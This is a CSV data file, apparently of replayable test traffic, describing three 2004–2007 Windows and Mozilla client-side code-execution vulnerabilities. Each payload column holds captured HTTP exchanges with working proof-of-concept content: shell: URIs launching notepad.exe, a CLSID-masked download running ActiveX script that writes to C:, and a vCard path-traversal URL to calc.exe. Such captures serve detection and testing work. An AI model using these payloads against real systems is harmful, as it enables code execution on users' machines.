XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20040708-01_Mozilla_shell_Protocol_Validation_Vulnerability.xml,Mozilla shell Protocol Validation Vulnerability,"There exists a vulnerability in the way products based on the Mozilla web engine validate URIs using the shell scheme. Using a specially crafted shell URI, an attacker can run executable files located on a target system, or start applications registered to handle certain file types. This vulnerability can also be used as a remote attack vector to vulnerabilities that would otherwise be considered local only.",HTTP,TCP,"GET /shell_poc.html HTTP/1.1[[0D 0A ]]Host: 10.2.1.101[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040626 Firefox/0.9.1[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0D 0A ]]Accept-Language: en-us,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
FSC20040708-01_Mozilla_shell_Protocol_Validation_Vulnerability.xml,Mozilla shell Protocol Validation Vulnerability,"There exists a vulnerability in the way products based on the Mozilla web engine validate URIs using the shell scheme. Using a specially crafted shell URI, an attacker can run executable files located on a target system, or start applications registered to handle certain file types. This vulnerability can also be used as a remote attack vector to vulnerabilities that would otherwise be considered local only.",HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Fri, 09 Jul 2004 04:14:39 GMT[[0D 0A ]]Server: Apache/2.0.48 (Fedora)[[0D 0A ]]Last-Modified: Fri, 09 Jul 2004 04:10:28 GMT[[0D 0A ]]ETag: ""43c064-330-2ef51500""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 816[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=UTF-8[[0D 0A 0D 0A ]]<html>[[0A ]]<head>[[0A ]]<title>Mozilla shell protocol validation vulnerability POC </title>[[0A ]]</head>[[0A ]]<body>[[0A ]]<p><a href=""shell:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.grp"">Group File Converter crash via Mozilla</a></p>[[0A ]]<p><a href=""shell:windows\system32\notepad.exe"">Execute notepad.exe via Mozilla</a></p>[[0A ]]</body>[[0A ]]</html>[[0A 0A]]"
﻿FSC20040708-01_Mozilla_shell_Protocol_Validation_Vulnerability_IPv6.xml,Mozilla shell Protocol Validation Vulnerability (IPv6 Version),"There exists a vulnerability in the way products based on the Mozilla web engine validate URIs using the shell scheme. Using a specially crafted shell URI, an attacker can run executable files located on a target system, or start applications registered to handle certain file types. This vulnerability can also be used as a remote attack vector to vulnerabilities that would otherwise be considered local only. (IPv6 Version)",HTTP/IPv6,TCP,"GET /shell_poc.html HTTP/1.1[[0D 0A ]]Host: 10.2.1.101[[0D 0A ]]User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7) Gecko/20040626 Firefox/0.9.1[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0D 0A ]]Accept-Language: en-us,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
FSC20040708-01_Mozilla_shell_Protocol_Validation_Vulnerability_IPv6.xml,Mozilla shell Protocol Validation Vulnerability (IPv6 Version),"There exists a vulnerability in the way products based on the Mozilla web engine validate URIs using the shell scheme. Using a specially crafted shell URI, an attacker can run executable files located on a target system, or start applications registered to handle certain file types. This vulnerability can also be used as a remote attack vector to vulnerabilities that would otherwise be considered local only. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Fri, 09 Jul 2004 04:14:39 GMT[[0D 0A ]]Server: Apache/2.0.48 (Fedora)[[0D 0A ]]Last-Modified: Fri, 09 Jul 2004 04:10:28 GMT[[0D 0A ]]ETag: ""43c064-330-2ef51500""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 816[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=UTF-8[[0D 0A 0D 0A ]]<html>[[0A ]]<head>[[0A ]]<title>Mozilla shell protocol validation vulnerability POC </title>[[0A ]]</head>[[0A ]]<body>[[0A ]]<p><a href=""shell:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.grp"">Group File Converter crash via Mozilla</a></p>[[0A ]]<p><a href=""shell:windows\system32\notepad.exe"">Execute notepad.exe via Mozilla</a></p>[[0A ]]</body>[[0A ]]</html>[[0A 0A]]"
﻿FSC20040713-03_Microsoft_Windows_Shell_Vulnerability.xml,Microsoft Windows Shell Vulnerability,"There exists a vulnerability in the Microsoft Windows Shell pertaining to the method of launching applications. By using a specially crafted file name, an attacker can mask the file-type of a file. The attacker can then entice a user to open a file which appears to be innocuous, but which results in the remote execution of code.",HTTP,TCP,"GET / HTTP/1.1[[0D 0A ]]Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/msword, */*[[0D 0A ]]Accept-Language: en-us[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)[[0D 0A ]]Host: 10.2.1.161[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]"
FSC20040713-03_Microsoft_Windows_Shell_Vulnerability.xml,Microsoft Windows Shell Vulnerability,"There exists a vulnerability in the Microsoft Windows Shell pertaining to the method of launching applications. By using a specially crafted file name, an attacker can mask the file-type of a file. The attacker can then entice a user to open a file which appears to be innocuous, but which results in the remote execution of code.",HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 13 Jul 2004 19:59:16 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Connection: close[[0D 0A ]]Content-Disposition: attachment; filename=""file.{3050f4d8-98B5-11CF-BB82-00AA00BDCE0B}just_some_string_to_takeup_spaces%2empeg""[[0D 0A ]]Content-Type: application/mpeg[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<head>[[0D 0A ]]<title>PoC</title>[[0D 0A ]]</head>[[0D 0A ]]<body>[[0D 0A ]]<script>[[0D 0A ]]var y=new ActiveXObject(""Scripting.FileSystemObject"");[[0D 0A ]]var x=y.CreateTextFile(""c:/footprint.txt"",true);[[0D 0A ]]if(x) x.WriteLine(""system tainted"");[[0D 0A ]]if(x) x.Close();[[0D 0A ]]alert(""code executed, check c:\\footprint.txt"");[[0D 0A ]]</script>[[0D 0A ]]</body>[[0D 0A ]]</html>[[0D 0A 0D 0A]]"
﻿FSC20040713-03_Microsoft_Windows_Shell_Vulnerability_IPv6.xml,Microsoft Windows Shell Vulnerability (IPv6 Version),"There exists a vulnerability in the Microsoft Windows Shell pertaining to the method of launching applications. By using a specially crafted file name, an attacker can mask the file-type of a file. The attacker can then entice a user to open a file which appears to be innocuous, but which results in the remote execution of code. (IPv6 Version)",HTTP/IPv6,TCP,"GET / HTTP/1.1[[0D 0A ]]Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/msword, */*[[0D 0A ]]Accept-Language: en-us[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)[[0D 0A ]]Host: 10.2.1.161[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]"
FSC20040713-03_Microsoft_Windows_Shell_Vulnerability_IPv6.xml,Microsoft Windows Shell Vulnerability (IPv6 Version),"There exists a vulnerability in the Microsoft Windows Shell pertaining to the method of launching applications. By using a specially crafted file name, an attacker can mask the file-type of a file. The attacker can then entice a user to open a file which appears to be innocuous, but which results in the remote execution of code. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 13 Jul 2004 19:59:16 GMT[[0D 0A ]]Server: Apache[[0D 0A ]]Connection: close[[0D 0A ]]Content-Disposition: attachment; filename=""file.{3050f4d8-98B5-11CF-BB82-00AA00BDCE0B}just_some_string_to_takeup_spaces%2empeg""[[0D 0A ]]Content-Type: application/mpeg[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<head>[[0D 0A ]]<title>PoC</title>[[0D 0A ]]</head>[[0D 0A ]]<body>[[0D 0A ]]<script>[[0D 0A ]]var y=new ActiveXObject(""Scripting.FileSystemObject"");[[0D 0A ]]var x=y.CreateTextFile(""c:/footprint.txt"",true);[[0D 0A ]]if(x) x.WriteLine(""system tainted"");[[0D 0A ]]if(x) x.Close();[[0D 0A ]]alert(""code executed, check c:\\footprint.txt"");[[0D 0A ]]</script>[[0D 0A ]]</body>[[0D 0A ]]</html>[[0D 0A 0D 0A]]"
﻿FSC20070726-10_Microsoft_Windows_ShellExecute_and_IE7_URL_Handling_Code_Execution.xml,Microsoft Windows ShellExecute and IE7 URL Handling Code Execution,A vulnerability has been reported in Microsoft Windows that could be exploited by remote attackers to compromise a vulnerable system. The issue exists in the interaction between ShellExecute and IE7 URLMon component when handling malformed URLs. Successful exploitation would allow the attacker to execute arbitrary command on the vulnerable client system within the context of the logged in user.,HTTP,TCP,"GET /~blin/poc.vcf HTTP/1.1[[0D 0A ]]Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*[[0D 0A ]]Accept-Language: en-us[[0D 0A ]]UA-CPU: x86[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)[[0D 0A ]]Host: 172.16.1.2[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]"
FSC20070726-10_Microsoft_Windows_ShellExecute_and_IE7_URL_Handling_Code_Execution.xml,Microsoft Windows ShellExecute and IE7 URL Handling Code Execution,A vulnerability has been reported in Microsoft Windows that could be exploited by remote attackers to compromise a vulnerable system. The issue exists in the interaction between ShellExecute and IE7 URLMon component when handling malformed URLs. Successful exploitation would allow the attacker to execute arbitrary command on the vulnerable client system within the context of the logged in user.,HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 16 Oct 2007 00:49:23 GMT[[0D 0A ]]Server: Apache/2.0.52 (CentOS) PHP/4.3.9 mod_python/3.1.3 Python/2.3.4 mod_perl/2.0.1 Perl/v5.8.5[[0D 0A ]]Last-Modified: Tue, 16 Oct 2007 00:48:32 GMT[[0D 0A ]]ETag: ""db0a75-95-8b4f5800""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 149[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content-Type: text/plain; charset=ISO-8859-1[[0D 0A 0D 0A ]]BEGIN:VCARD[[0D 0A ]]VERSION:2.1[[0D 0A ]]N:;poc[[0D 0A ]]FN:poc[[0D 0A ]]URL;HOME:mailto:poc@test.comfoo%../../../../windows/system32/calc.exe"".cmd[[0D 0A ]]REV:20071015T052155Z[[0D 0A ]]END:VCARD"
